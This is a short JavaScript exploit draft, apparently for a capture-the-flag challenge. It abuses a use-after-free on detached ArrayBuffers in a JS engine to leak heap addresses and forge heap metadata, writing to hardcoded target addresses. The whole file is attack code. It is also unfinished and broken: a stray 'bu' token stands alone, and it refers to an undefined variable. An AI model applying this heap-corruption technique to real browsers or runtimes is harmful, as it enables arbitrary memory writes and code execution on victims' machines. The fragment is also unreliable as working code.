var buff1 = new ArrayBuffer(0x408)
var buff1_view = new BigUint64Array(buff1)

ArrayBufferDetach(buff1)
buff1_view[1] = 0n
ArrayBufferDetach(buff1)

heap_leak = buff1_view[0] - 0x8e8n - 8n // 0x555555686b58
//heap_leak = 0x7ffff7dcf8e8n
buff1 = new ArrayBuffer(0x408)
buff1_view[0] = heap_leak

var buff2 = new ArrayBuffer(0x408)
var buff2_view = new BigUint64Array(buff2)
buff1_view[0] = 1n
buff1_view[1] = BigInt(0x555555683258 - 8)                 // *buff1_view[1] = buff1_view[2]
buff1_view[2] = BigInt(0x555555683258)                     // *buff1_view[2] = buff1_view[1] - 8
buff1_view[3] = heap_leak
buff1_view[4] = 4n
buff1_view[5] = 5n
buff1_view[6] = 6n
buff1_view[7] = 0x4141414141414141n

var buff3_view = new BigUint64Array(128)
buff3_view[3] = heap_leak + 0x8e8n + 8n
buff3_view[0] = heap_leak

buff2_view[0] = 0x7ffff7a31550n

// 0x555555683258
bu

ArrayBufferDetach(buff1)
arr1_u64[3]=0x4141414141414141n

for (let i=0; i<0x18; i++) console.log(arr1_u64[i].toString(16))